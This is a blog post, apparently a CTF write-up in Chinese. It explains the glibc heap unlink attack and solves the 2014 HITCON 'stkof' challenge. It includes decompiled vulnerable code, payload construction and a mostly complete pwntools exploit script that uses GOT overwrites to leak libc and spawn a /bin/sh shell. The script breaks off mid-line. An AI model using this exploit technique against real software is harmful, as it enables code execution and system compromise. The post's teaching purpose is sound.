<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="Unlink在free堆块时，要满足释放的该chunk不在tcache(带着chunkhead，0x410)或fastbin(0x80)范围内，free的chunk物理地址前或后有freechunk时会进行unlink操作，unlink就是把这个chunk从双向链表里拿下来 调用关系大致如下 #define unlink(AV, P, BK, FD)static void _int_free (m">
<meta property="og:type" content="article">
<meta property="og:title" content="Unlink-2014-HITCON-stkof">
<meta property="og:url" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/index.html">
<meta property="og:site_name" content="Computer Security">
<meta property="og:description" content="Unlink在free堆块时，要满足释放的该chunk不在tcache(带着chunkhead，0x410)或fastbin(0x80)范围内，free的chunk物理地址前或后有freechunk时会进行unlink操作，unlink就是把这个chunk从双向链表里拿下来 调用关系大致如下 #define unlink(AV, P, BK, FD)static void _int_free (m">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png">
<meta property="article:published_time" content="2023-03-14T12:18:14.000Z">
<meta property="article:modified_time" content="2023-03-29T16:53:36.677Z">
<meta property="article:author" content="Grxer">
<meta property="article:tag" content="Unlink">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Unlink-2014-HITCON-stkof</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/03/13/ciscn-2019-s-3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&text=Unlink-2014-HITCON-stkof"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&is_video=false&description=Unlink-2014-HITCON-stkof"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Unlink-2014-HITCON-stkof&body=Check out this article: https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&title=Unlink-2014-HITCON-stkof"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&name=Unlink-2014-HITCON-stkof&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/14/Unlink-2014-HITCON-stkof/&t=Unlink-2014-HITCON-stkof"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink"><span class="toc-number">1.</span> <span class="toc-text">Unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2014-HITCON-stkof"><span class="toc-number">2.</span> <span class="toc-text">2014 HITCON stkof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">缓冲区问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0fill%E5%9C%B0%E5%9D%80%E5%8F%AF%E6%8E%A7"><span class="toc-number">2.2.</span> <span class="toc-text">实现fill地址可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%EF%BC%8Cleak%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%8B%BFshell%E8%B5%B0%E4%BA%BA"><span class="toc-number">2.3.</span> <span class="toc-text">任意地址读写，leak数据，拿shell走人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Unlink-2014-HITCON-stkof
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Grxer</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-14T12:18:14.000Z" itemprop="datePublished">2023-03-14</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Unlink/" rel="tag">Unlink</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>在free堆块时，要满足释放的该chunk不在tcache(带着chunkhead，0x410)或fastbin(0x80)范围内，free的chunk物理地址前或后有freechunk时会进行unlink操作，unlink就是把这个chunk从双向链表里拿下来</p>
<p>调用关系大致如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">    _int_free()&#123;</span><br><span class="line">        unlink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>unlink是一个宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                      </span><br><span class="line">    BK = P-&gt;bk;                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                      </span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,				      </span><br><span class="line">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                   P, AV);					      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                      </span><br><span class="line">          &#125;                                      </span><br><span class="line">      &#125;                                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>



<p>Unlink这里会有几个检测</p>
<ul>
<li>检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</li>
<li>检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</li>
<li>经常被释放chunk的fd的bk是否指向p，被释放chunk的bk的fd是否指向p</li>
</ul>
<p>我们着重分析一下这里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                      </span><br><span class="line">BK = P-&gt;bk;                                      </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"><span class="keyword">else</span> &#123;                                      </span><br><span class="line">    FD-&gt;bk = BK;                                  </span><br><span class="line">    BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<p>我们怎么绕过检测通过unlink实现任意地址读写呢</p>
<p>在64位程序下，我们被unlink的chunk是P</p>
<p>我们伪造chunk P </p>
<p>P-&gt;fd &#x3D; target addr -0x18</p>
<p>P-&gt;bk &#x3D; expect value</p>
<p>FD &#x3D; P-&gt;fd &#x3D; target-0x18</p>
<p>BK &#x3D; P-&gt;bk &#x3D; expect value</p>
<p><strong>FD-&gt;bk &#x3D; BK —&gt;*(target-0x18+0x18)&#x3D;*(P-&gt;fd+0x18)&#x3D;BK&#x3D;expect value</strong>		      </p>
<p><strong>BK-&gt;fd &#x3D; FD —&gt;*(expect value+0x10)&#x3D;FD&#x3D;target-0x18&#x3D;P-&gt;fd</strong></p>
<p>实现了任意地址读写但是没有绕过 if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); </p>
<p>也就是我们需要*(FD+0x18)&#x3D;P *(BK+0x10)&#x3D;P</p>
<p>如果我们可以在堆地址的某个地方伪造或者找到一个合适fake_chunk，这个chunk地址可以泄露出来，且符合&#x3D;P要求，我们把这个地址写到chunk P的fd和bk，在unlink时会发生什么呢</p>
<p>通过上面的分析，可以得知，</p>
<ul>
<li>第一步*(target)||*(P-&gt;fd+0x18)写入expect value||BK</li>
<li>第二步会在*(expect value+0x10)||*(p-&gt;bk+10)写入target-0x18||P-&gt;fd</li>
<li>如果我们可以控制这个地址内容，也就是可以using after free，通过修改该地址内容就可以实现hook</li>
</ul>
<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec stkof</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/stkof&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序里有用的功能</p>
<ul>
<li>alloc分配内存，并写到bss段0x602140的全局数组里</li>
<li>free释放并置零指针，好评尼</li>
<li>fill填充申请堆区</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">fill</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的fill是有漏洞的，我们可以限定大小的堆里写入任意大小的数据造成堆溢出</p>
<p><strong>堆溢出给了我们伪造unlink_chunk的机会，global指针数组给了我们伪造fd bk绕过检测的机会</strong></p>
<h3 id="缓冲区问题"><a href="#缓冲区问题" class="headerlink" title="缓冲区问题"></a>缓冲区问题</h3><p>alloc(16)<br>alloc(32)<br>alloc(48)</p>
<p>我们这里先alloc三个堆块</p>
<p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png" alt="image-20230314233831972"></p>
<p>这里发现多了两个堆块在alloc(16)中间，这是因为程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。在第一个malloc时，刚好有fget和printf</p>
<p>第一个chunk被包围不好利用，所以我们选择绕过第一个</p>
<h3 id="实现fill地址可控"><a href="#实现fill地址可控" class="headerlink" title="实现fill地址可控"></a>实现fill地址可控</h3><p>这里我们申请三个堆块，</p>
<p>alloc(0x10)<br>alloc(0x30)<br>alloc(0x80)</p>
<p>利用堆溢出，可以伪造unlink——chunk，我们选择在堆块二伪造</p>
<p>chunkhead需要0x10字节，fd bk需要0x10字节，后面数据需要0x10字节，第二个堆块至少0x30</p>
<p>第三个堆块需要在free的时候出发unlink操作，需要大于fastbin最大容量，申请0x80即可</p>
<ul>
<li>chunkhead伪造p64(0x0)+p64(0x30)即可</li>
<li>fd和bk这里我们需要FD-&gt;bk &#x3D; P &amp;&amp; BK-&gt;fd &#x3D; P<ul>
<li>这里我们可以利用globa指针数组里内容伪造双向链表</li>
<li>这时候我们的伪造unlink堆P&#x3D;0x0000000002c87450我们选取0x602138作为fd刚好满足FD-&gt;bk &#x3D; P</li>
<li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png" alt="image-20230315001634637"></li>
<li>选取0x602140作为bk刚好满足BK-&gt;fd &#x3D; P</li>
<li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png" alt="image-20230315001757168"></li>
<li>这里我们只需要关系FD的bk和BK的fd就好其他和我们unlink无关比如说我们FD的fd，我管你指向谁，我们不关心</li>
</ul>
</li>
</ul>
<p>payload&#x3D;p64(0x0)+p64(0x31)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x00)+p64(0x6666)</p>
<p>伪造好unlinkchunk，伪造chunk3，把prevsize改写为伪造chunk大小，把size <strong>PREV_INUSE</strong>位置零</p>
<p>payload +&#x3D; p64(0x30)+p64(0x90)</p>
<p>然后我们去释放chunk3 触发unlink</p>
<p>按照我们先前的分析</p>
<ul>
<li>先把fd+0x18&#x3D;0x602138+0x18&#x3D;0x602150地址写入bk&#x3D;0x602140</li>
<li>再把bk+0x10&#x3D;0x602140+0x10&#x3D;0x602150地址写入fd&#x3D;0x602138</li>
</ul>
<p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png" alt="image-20230315002921373"></p>
<p>和分析一样</p>
<h3 id="任意地址读写，leak数据，拿shell走人"><a href="#任意地址读写，leak数据，拿shell走人" class="headerlink" title="任意地址读写，leak数据，拿shell走人"></a>任意地址读写，leak数据，拿shell走人</h3><p>这样我们fill chunk2时就可以，修改全局指针数组为任何地址，再通过fill修改这个地址为任何值</p>
<p>payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)</p>
<p>edit(2,len(payload),payload)</p>
<p>这样s[0]&#x3D;free_got，s[1]&#x3D;puts_got，s[2]&#x3D;atoi_got</p>
<p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png" alt="image-20230315005329559"></p>
<p>payload &#x3D; p64(puts_plt)<br>edit(0,len(payload),payload)<br>free(1)</p>
<p>先把freegot改为puts plt，这样free(1)&#x3D;&#x3D;puts(puts_got)</p>
<p>leak出libc后</p>
<p>payload &#x3D; p64(system)<br>edit(2,len(payload),payload)</p>
<p>把atoi_got改为system。利用choice &#x3D; atoi(nptr);在输入时构造binsh即可payload &#x3D; ‘&#x2F;bin&#x2F;sh\x00’<br>io.sendline(payload)</p>
<p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png" alt="image-20230315010413491"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./stkof&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x4009E6&#x27;)#alloc</span></span><br><span class="line">db(<span class="string">&#x27;b* 0x400AE3&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BA7&#x27;) #free</span></span><br><span class="line">head=<span class="number">0x602140</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(head+<span class="number">16</span>-<span class="number">0x18</span>)+p64(head+<span class="number">16</span>-<span class="number">0x10</span>)+p64(<span class="number">0x00</span>)+p64(<span class="number">0x6666</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">payload = p64(system)</span><br><span 